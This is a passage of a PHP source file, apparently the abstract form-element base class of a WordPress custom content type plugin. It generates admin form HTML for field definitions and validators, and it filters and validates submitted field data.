				<div class="'.self::wrapper_css_class .'" id="output_filter_wrapper">
				 	<label for="output_filter" class="cctm_label cctm_select_label" id="output_filter_label">'
				.__('Default Output Filter', CCTM_TXTDOMAIN) .'
				 		<a href="http://code.google.com/p/wordpress-custom-content-type-manager/wiki/OutputFilters" target="_blank"><img src="'.CCTM_URL .'/images/question-mark.gif" width="16" height="16" /></a>
				 		</label>';
	
			$out .= '<select name="output_filter" class="cctm_select" id="output_filter">
					<option value="">'.__('None (raw)').'</option>
					';
		
		foreach ($available_output_filters as $filter => $filename) {
		
			require_once($filename);
			
			$classname = CCTM::filter_prefix . $filter;
		
			$Obj = new $classname();

			if ($Obj->show_in_menus) {
				$is_selected = '';
				if ( isset($def['output_filter']) && $def['output_filter'] == $filter ) {
					$is_selected = 'selected="selected"';
				}
				$out .= '<option value="'.$filter.'" '.$is_selected.'>'.$Obj->get_name().' ('.$filter.')</option>';
			}
			
		}

		$out .= '</select>
			' . $this->get_translation('output_filter')
			.'</div>
			</div><!-- /inside -->
		</div><!-- /postbox -->';

		return $out;
	}

	//------------------------------------------------------------------------------
	/**
	 * Get the standard fields for the field definition -- the "standard" fields are
	 * the ones that represent the attributes that every field will have: 
	 * Label, Name, Default Value, Extra, Class, is Repeatable, Description.
	 *
	 * @param	array	current def
	 * @return	strin	HTML
	 */
	public function format_standard_fields($def, $show_repeatable=true) {
		$is_checked = '';
		if (isset($def['is_repeatable']) && $def['is_repeatable'] == 1) {
			$is_checked = 'checked="checked"';
		}

		$out = '<div class="postbox">
			<div class="handlediv" title="Click to toggle"><br /></div>
			<h3 class="hndle"><span>'. __('Standard Fields', CCTM_TXTDOMAIN).'</span></h3>
			<div class="inside">';
			
		// Label
		$out .= '<div class="'.self::wrapper_css_class .'" id="label_wrapper">
			 		<label for="label" class="'.self::label_css_class.'">'
			.__('Label', CCTM_TXTDOMAIN).'</label>
			 		<input type="text" name="label" class="'.self::css_class_prefix.'text" id="label" value="'.htmlspecialchars($def['label']) .'"/>
			 		' . $this->get_translation('label').'
			 	</div>';
		// Name
		$out .= '<div class="'.self::wrapper_css_class .'" id="name_wrapper">
				 <label for="name" class="cctm_label cctm_text_label" id="name_label">'
			. __('Name', CCTM_TXTDOMAIN) .
			'</label>
				 <input type="text" name="name" class="cctm_text" id="name" value="'.htmlspecialchars($def['name']) .'"/>'
			. $this->get_translation('name') .'
			 	</div>';

		// Default Value
		$out .= '<div class="'.self::wrapper_css_class .'" id="default_value_wrapper">
			 	<label for="default_value" class="cctm_label cctm_text_label" id="default_value_label">'
			.__('Default Value', CCTM_TXTDOMAIN) .'</label>
			 		<input type="text" name="default_value" class="cctm_text" id="default_value" value="'. htmlspecialchars($def['default_value'])
			.'"/>
			 	' . $this->get_translation('default_value') .'
			 	</div>';

		// Extra
		$out .= '<div class="'.self::wrapper_css_class .'" id="extra_wrapper">
			 		<label for="extra" class="'.self::label_css_class.'">'
			.__('Extra', CCTM_TXTDOMAIN) .'</label>
			 		<input type="text" name="extra" class="cctm_text" id="extra" value="'
			.htmlspecialchars($def['extra']).'"/>
			 	' . $this->get_translation('extra').'
			 	</div>';

		// Class
		$out .= '<div class="'.self::wrapper_css_class .'" id="class_wrapper">
			 	<label for="class" class="'.self::label_css_class.'">'
			.__('Class', CCTM_TXTDOMAIN) .'</label>
			 		<input type="text" name="class" class="cctm_text" id="class" value="'
			.htmlspecialchars($def['class']).'"/>
			 	' . $this->get_translation('class').'
			 	</div>';

		if ($show_repeatable) {
			// Is Repeatable?
			$out .= '<div class="'.self::wrapper_css_class .'" id="is_repeatable_wrapper">
					 <label for="is_repeatable" class="cctm_label cctm_checkbox_label" id="is_repeatable_label">'
				. __('Is Repeatable?', CCTM_TXTDOMAIN) .
				'</label>
					 <br />
					 <input type="checkbox" name="is_repeatable" class="cctm_checkbox" id="is_repeatable" value="1" '. $is_checked.'/> <span>'.$this->descriptions['is_repeatable'].'</span>
				 	</div>';
		}

		// Description
		$out .= '<div class="'.self::wrapper_css_class .'" id="description_wrapper">
			 	<label for="description" class="'.self::label_css_class.'">'
			.__('Description', CCTM_TXTDOMAIN) .'</label>
			 	<textarea name="description" class="cctm_textarea" id="description" rows="5" cols="60">'. htmlspecialchars($def['description']).'</textarea>
			 	' . $this->get_translation('description').'
			 	</div>';
			 	
		$out .= '</div><!-- /inside -->
			</div><!-- /postbox -->';	 	
		
		return $out;	
	}
	
	//------------------------------------------------------------------------------
	/**
	 * Get the list of available validators.
	 *
	 * @param	array	current def
	 * @return	strin	HTML
	 */
	public function format_validators($def, $show_validators=true) {
		$req_is_checked = '';
		if (isset($def['required']) && $def['required'] == 1) {
			$req_is_checked = 'checked="checked"';
		}

		// Is Required?

		// Get available Validators
		$select_options = '';
		$validation_select = ''; // containing select element
		$validator_options = ''; // options for the active validator (if any)
		if ($show_validators) {
			$validators = CCTM::get_available_helper_classes('validators');
			foreach ($validators as $shortname => $path) {
			
				$Vobj = CCTM::load_object($shortname, 'validators');
				if (!$Vobj) {
					continue;  // skip  bogus validators
				}
				$is_selected = '';
				if ($this->validator == $shortname) {
					$is_selected = ' selected="selected"';
					$Vobj->set_options($this->validator_options);
					$validator_options = $Vobj->draw_options();
				}
				
				$select_options .= sprintf('<option value="%s"%s>%s</option>', $shortname, $is_selected, $Vobj->get_name());
				
				$validation_select = '
				<div class="'.self::wrapper_css_class .'" id="validator_wrapper">
					<label for="validator" class="cctm_label cctm_dropdown_label" id="validator_label">'
					. __('Validation Rule', CCTM_TXTDOMAIN) .
					'</label>
					<span class="cctm_description">'.__('A validation rule can ensure that any data entered into this field meets a specific criteria.', CCTM_TXTDOMAIN).'</span>
					<br />
					<select id="validator" name="validator" onchange="javascript:get_validator_options();">
						<option value="">-- '.__('None', CCTM_TXTDOMAIN).'--</option>				
						'. $select_options .'
					</select>
			 	</div>';
			}
		}
		
		$out = '
		<div class="postbox">
			<div class="handlediv" title="Click to toggle"><br /></div>
			<h3 class="hndle"><span>'. __('Validation', CCTM_TXTDOMAIN).'</span></h3>
			<div class="inside">

				<table>
					<tr>
						<td style="vertical-align:top">
						
				<div class="'.self::wrapper_css_class .'" id="required_wrapper">
					<label for="required" class="cctm_label" id="required_label">'
					. __('Required?', CCTM_TXTDOMAIN) .
					'</label>
					<br />
					<input type="checkbox" name="required" class="cctm_checkbox" id="required" value="1" '. $req_is_checked.'/> <span class="cctm_checkbox_label">'.$this->descriptions['required'].'</span>
			 	</div>'
			 	.$validation_select.'
						
						</td>
						<td width="100"></td>
						<td style="vertical-align:top">
							<div id="validator_options">
								'.$validator_options.'
							</div>
			 			</td>
			 		</tr>
			 	</table>
			 	
		 	</div><!-- /inside -->
		</div><!-- /postbox -->
		';
		
		return $out;
	}

	//------------------------------------------------------------------------------
	/**
	 * This should return (not print) form elements that handle all the controls
	 * required to define this type of field.  The default properties (stored in
	 * $this->props)correspond to this class's public variables, e.g. name, label,
	 * etc. and should be defined at the top of the child class.
	 *
	 * The form elements you create should have names that correspond to the public
	 * $props variable. A populated array of $props will be stored with each custom
	 * field definition. (See notes on the CCTM data structure).
	 *
	 * Override this function in the rare cases when you need behavior that is specific
	 * to when you first define a field definition. Most of the time, the create/edit
	 * functions are nearly identical. When you create a field definition, the
	 * current values are the values hard-coded into the $props array at the top
	 * of the child FieldElement class; when editing a field definition, the current
	 * values are read from the database (the array should be the same structure as
	 * the $props array, but the values may differ).
	 *
	 * @return string HTML input fields
	 */
	public function get_create_field_definition() {
		return $this->get_edit_field_definition( $this->props );
	}


	//------------------------------------------------------------------------------
	/**
	 * get_create_field_instance
	 *
	 * This generates the field elements when a user creates a new post that uses a
	 * field of this type.  In most cases, the form elements generated for a new post
	 * are identical to the form elements generated when editing a post, so the default
	 * behavior is to set the current value to the default value and hand this off to
	 * the get_edit_field_instance() function.
	 *
	 * Override this function in the rare cases when you need behavior that is specific
	 * to when you create a post (e.g. to specify a dynamic default value).
	 * Most of the time, the create/edit functions are nearly identical.
	 *
	 * @return string HTML field(s)
	 */
	public function get_create_field_instance() {
		
		if($this->is_repeatable) {			
			$this->default_value = json_encode(array($this->default_value));
		}
		
		// Add this to flag that it's a new post.
		return $this->get_edit_field_instance($this->default_value) 
			. '<input type="hidden" name="_cctm_is_create" value="1" />';
	}

	//------------------------------------------------------------------------------
	/**
	 * This function gives a description of this type of field so users will know
	 * whether or not they want to add this type of field to their custom content
	 * type. The string should be no longer than 255 characters.
	 * The returned value should be localized using the __() function.
	 *
	 * @return string plain text description
	 */
	abstract public function get_description();

	//------------------------------------------------------------------------------
	/**
	 * get_edit_field_instance
	 *
	 * The form returned is what is displayed when a user is editing a post that contains
	 * an instance of this field type.
	 *
	 * @param string  $current_value is the current value for the field, as stored in the
	 *     wp_postmeta table for the post being edited.
	 * @return string HTML element.
	 */
	abstract public function get_edit_field_instance($current_value);

	//------------------------------------------------------------------------------
	/**
	 * This should return (not print) form elements that handle all the controls required to define this
	 * type of field.  The default properties correspond to this class's public variables,
	 * e.g. name, label, etc. The form elements you create should have names that correspond
	 * with the public $props variable. A populated array of $props will be stored alongside
	 * the custom-field data for the containing post-type.
	 *
	 * @param mixed   $current_values should be an associative array.
	 * @return string HTML input fields
	 */
	abstract public function get_edit_field_definition($current_values);

	//------------------------------------------------------------------------------
	/**
	 * This function provides a name for this type of field. This should return plain
	 * text (no HTML). The string should be no longer than 32 characters.
	 * The returned value should be localized using the __() function.
	 *
	 * @return string
	 */
	abstract public function get_name();
	
	//------------------------------------------------------------------------------
	/**
	 * This function should return the URL where users can read more information about
	 * this type of field (include a brief explanation and examples of how or why you'd
	 * want to use it. The URL may be localized using __() if necessary (e.g. for 
	 * language-specific pages). 3rd party field devs can use this to URL point to their 
	 * awesome docs!
	 *
	 * @return string  e.g. http://www.yoursite.com/some/page.html
	 */
	abstract public function get_url();


	/**
	 * This function handles converting the value stored in the database to a PHP data
	 * type. Special logic is required to handle the JSON encoding of "repeatable" fields
	 * and the possibility that the definition of the field changed.
	 *
	 * NOTE: If the field def was changed from dropdown to multi-select, the value 
	 * would be MYVALUE instead of ["MYVALUE"]... so the selection would fail.
	 *
	 * If to_array is the conversion, then single values get converted to arrays.
	 * If to_string is the conversion, then JSON encoded arrays return only the 1st
	 * value stored. E.g. ["1","2"] ==> 1
	 *
	 * @param	mixed	$str normally JSON-encoded string, but also handles php array
	 * @param	string	$conversion to_string|to_array
	 * @return mixed (a string or an array, depending on the $conversion)
	 */		
	public function get_value($str, $conversion='to_array') {
		if ($conversion == 'to_array') {			
			if (empty($str) || $str=='[""]') {
				return array();
			}
			
			if (!is_array($str)) {
                $out = (array) json_decode($str, true);
			}
			else {
                $out = $str;
			}
			// the $str was not JSON encoded
			if (empty($out)) {
				return array($str);
			}
			else {
				return $out;
			}
		}
		// to_string.  We do some special acrobatics here to handle the case where a repeatable 
		// field was changed to a normal singular field.  Repeatable fields would be JSON encoded,
		// so we test for that and we try to extract the 1st value.
		// Note that json_decode treats alphabetical strings differently than numeric strings!!!
		else {
			if ($str=='[""]') {
				return '';
			}
			if (is_numeric($str)) {
				return $str;
			}
			if (!is_array($str)) {			
    			$out = (array) json_decode($str, true);
            }
            else {
                $out = $str;
            }
			// the $str was not JSON encoded
			if (empty($out)) {
				return $str;
			}
			else {
				return $out[0];
			}

		}
	}

	//------------------------------------------------------------------------------
	/**
	 * Formats errors in the field definition, e.g. invalid characters in field name, 
	 * or reserved field name.
	 *
	 * @return string HTML describing any errors tracked in the class $errors variable
	 */
	public function format_errors() {
		$error_str = '';
		foreach ( $this->errors as $tmp => $errors ) {
			foreach ( $errors as $e ) {
				$error_str .= '<li>'.$e.'</li>
				';
			}
		}

		return sprintf('<div class="error">
			<h3>%1$s</h3>
			<ul style="margin-left:30px">
				%2$s
			</ul>
			</div>'
			, __('There were errors in your custom field definition.', CCTM_TXTDOMAIN)
			, $error_str
		);
	}




	//------------------------------------------------------------------------------
	/**
	 * Return URL to a 48x48 PNG image that should represent this type of field.
	 * Looks inside the images/custom-fields directory.  3rd party devs should
	 * override this function.
	 *
	 * @return string URL for image, e.g. http://mysite/images/coolio.png
	 */
	public function get_icon() {
		$field_type = str_replace(
			CCTM::field_prefix,
			'',
			get_class($this) );
		// Default image
		if (file_exists(CCTM_PATH.'/images/custom-fields/'.$field_type.'.png')) {
			return CCTM_URL.'/images/custom-fields/'.$field_type.'.png';
		}
		// Snap, we can't find it.
		else {
			return CCTM_URL.'/images/custom-fields/default.png';
		}
	}

    //------------------------------------------------------------------------------
    /**
     * Show a brief bit about the options defined for this field.  This is useful 
     * when reviewing a list of custom fields.  It returns a short string describing
     * the options set for this field.  Depending on the type of field, this may
     * contain different info.
     * @return string
     */
    public function get_options_desc() {
        if (!empty($this->props['default_value'])) {
            return $this->props['default_value'] .'<em>('.__('default',CCTM_TXTDOMAIN).')</em>';
        }
        else {
            return '';
        }
    }
    
	//------------------------------------------------------------------------------
	/**
	 * Accessor to $this->props
	 */
	public function get_props() {
		return $this->props;
	}

	//------------------------------------------------------------------------------
	/**
	 * Implement this function if your custom field has global settings that apply
	 * to *all* instances of the field (e.g. an API key). If this function returns
	 * anything other than false, then a menu item will be created for the custom
	 * field type. The function (if implemented), should return an HTML form that
	 * allows users to modify the settings. The function must also handle the form
	 * submission.
	 *
	 * @return mixed: false or HTML form
	 */
	public function get_settings_page() {
		return false;
	}


	//------------------------------------------------------------------------------
	/**
	 * Wraps a given translation (from $this->descriptions) in a styled span.
	 *
	 * @param string  $item to identify which description you want.
	 * @return string HTML localized description
	 */
	public function get_translation($item) {
		return sprintf('<span class="cctm_description">%s</span>', $this->descriptions[$item]);
	}


	//------------------------------------------------------------------------------
	/**
	 * This function allows for custom handling of submitted post/page data just before
	 * it is saved to the database; it can be thought of loosely as the "on save" event.
	 * Data validation and filtering should happen here, although it's difficult to
	 * enforce any validation errors due to lack of an appropriate event (uh...WP?)
	 *
	 * Output should be whatever string value you want to store in the wp_postmeta table
	 * for the post and field in question. Default behavior is to simply trim the values.
	 *
	 * Note that the field name in the $_POST array is prefixed with CCTM_FormElement::post_name_prefix,
	 * e.g. the value for you 'my_field' custom field is stored in $_POST['cctm_my_field']
	 * (where CCTM_FormElement::post_name_prefix = 'cctm_'). This is done to avoid name
	 * collisions in the $_POST array.
	 *
	 * @param mixed   $posted_data $_POST data
	 * @param string  $field_name: the unique name for this instance of the field
	 * @return string whatever value you want to store in the wp_postmeta table where meta_key = $field_name
	 */
	public function save_post_filter($posted_data, $field_name) {
	
		global $wp_version;
	
		if ( isset($posted_data[ CCTM_FormElement::post_name_prefix . $field_name ]) ) {

			// is_array is equivalent to "is_repeatable"
			if (is_array($posted_data[ CCTM_FormElement::post_name_prefix . $field_name ])) {
				foreach($posted_data[ CCTM_FormElement::post_name_prefix . $field_name ] as &$f) {
					$f = stripslashes(trim($f));
				}
				// This is what preserves the foreign characters while they traverse the json and WP gauntlet
				// (yes, seriously we have to doubleslash it when we create a new post in versions
				// of WP prior to 3.3!!!)
				if (isset($posted_data['_cctm_is_create']) && version_compare($wp_version,'3.3','<')) {
					return addslashes(addslashes(json_encode($posted_data[ CCTM_FormElement::post_name_prefix . $field_name ])));
				}
				else {
					return addslashes(json_encode($posted_data[ CCTM_FormElement::post_name_prefix . $field_name ]));
				}				
			}
			// Normal single field
			else{
				return stripslashes(trim($posted_data[ CCTM_FormElement::post_name_prefix . $field_name ]));
			}
		}
		else {
			return '';
		}
	}



	//------------------------------------------------------------------------------
	/**
	 * Validate and sanitize any submitted data. Used when editing the definition for
	 * this type of element. Default behavior here is require only a unique name and
	 * label. Override this if customized validation is required: usually you'll want
	 * to override and still reference the parent:
	 *   public function save_definition_filter($posted_data) {
	 *   	$posted_data = parent::save_definition_filter($posted_data);
	 *   	// your code here...
	 *   	return $posted_data;
	 *  }
	 *
	 *
	 *     into the field values.
	 *
	 * @param array   $posted_data = $_POST data
	 * @return array filtered field_data that can be saved OR can be safely repopulated
	 */
	public function save_definition_filter($posted_data) {

		if ( empty($posted_data['name']) ) {
			$this->errors['name'][] = __('Name is required.', CCTM_TXTDOMAIN);
		}
		else {
			// Are there any invalid characters? 1st char. must be a letter (req'd for valid prop/func names)
			if ( !preg_match('/^[a-z]{1}[a-z_0-9]*$/i', $posted_data['name'])) {
				$this->errors['name'][] = sprintf(
					__('%s contains invalid characters. The name may only contain letters, numbers, and underscores, and it must begin with a letter.', CCTM_TXTDOMAIN)
					, '<strong>'.$posted_data['name'].'</strong>');
				$posted_data['name'] = preg_replace('/[^a-z_0-9]/', '', $posted_data['name']);
			}
			// Is the name too long?
			if ( strlen($posted_data['name']) > 255 ) {
				$posted_data['name'] = substr($posted_data['name'], 0 , 255);
				$this->errors['name'][] = __('The name is too long. Names must not exceed 255 characters.', CCTM_TXTDOMAIN);
			}
			// Run into any reserved words?
			if ( in_array($posted_data['name'], CCTM::$reserved_field_names ) ) {
				$this->errors['name'][] = sprintf(
					__('%s is a reserved name.', CCTM_TXTDOMAIN)
					, '<strong>'.$posted_data['name'].'</strong>');
				$posted_data['name'] = '';
			}

			// it's a CREATE operation
			if ( empty($this->original_name) ) {

				if ( isset(CCTM::$data['custom_field_defs']) && is_array(CCTM::$data['custom_field_defs'])) {
					foreach (CCTM::$data['custom_field_defs'] as $cf =>$def) {
						if (strtolower($posted_data['name']) == strtolower($cf)) {
							$this->errors['name'][] = sprintf( __('The name %s is already in use. Please choose another name.', CCTM_TXTDOMAIN), '<em>'.$posted_data['name'].'</em>');						
						}					
					}
				}
			}
			// it's an EDIT operation and we're renaming the field
			elseif ( $this->original_name != $posted_data['name'] ) {
				if ( isset(CCTM::$data['custom_field_defs']) && is_array(CCTM::$data['custom_field_defs'])) {
						if (strtolower($posted_data['name']) == strtolower($cf)) {
							$this->errors['name'][] = sprintf( __('The name %s is already in use. Please choose another name.', CCTM_TXTDOMAIN), '<em>'.$posted_data['name'].'</em>');						
						}
					$posted_data['name'] = '';
				}
			}
		}


		// You may need to do this for any textarea fields. Saving a '</textarea>' tag
		// in your description field can wreak everything.
		if ( !empty($posted_data['description']) ) {
			$posted_data['description'] = strip_tags($posted_data['description'], CCTM::$allowed_html_tags);
		}

		$posted_data = CCTM::striptags_deep($posted_data);
		// WP always quotes data (!!!), so we don't bother checking get_magic_quotes_gpc et al.
		// See this: http://kovshenin.com/archives/wordpress-and-magic-quotes/
		$posted_data = CCTM::stripslashes_deep($posted_data);

		//return $posted_data; // simplifiying immutable
		foreach ($this->immutable as $x) {
			if (isset($this->props[$x])) {
				$posted_data[$x] = $this->props[$x];
			}
			else {
				$posted_data[$x] = '';
			}		
		}
		return $posted_data;
		// Apply immutable properties, and return filtered data
		//return array_merge($posted_data, $this->immutable);
	}

	//------------------------------------------------------------------------------
	/**
	 * Shepherded access to the $this->props array.
	 */
	public function set_prop($key, $value) {
		if (is_scalar($key)) {
			$this->$key = $value;
		}
		else {
			$this->errors['improper_input_set_props'] = __('Improper input to the set_prop() function.', CCTM_TXTDOMAIN);
			return false;
		}
	}
	
	//------------------------------------------------------------------------------
	/**
	 * Shepherded access to the $this->props array.
	 */
	public function set_props($array) {
		if (!is_array($array)) {
			$this->errors['improper_input_set_props'] = __('Improper input to the set_props() function.', CCTM_TXTDOMAIN);
			return false;
		}
		
		foreach ($array as $k => $v) {
			$this->$k = $v;
		}
	}
	
	//------------------------------------------------------------------------------
	/**
	 * If your custom field has done any customizations (e.g. of the database)
	 * then you should implement this function to do cleanup: this is run when the
	 * the field is uninstalled or the CCTM plugin is uninstalled.
	 */
	public function uninstall() { }
}


/*EOF CCTM_FormElement.php */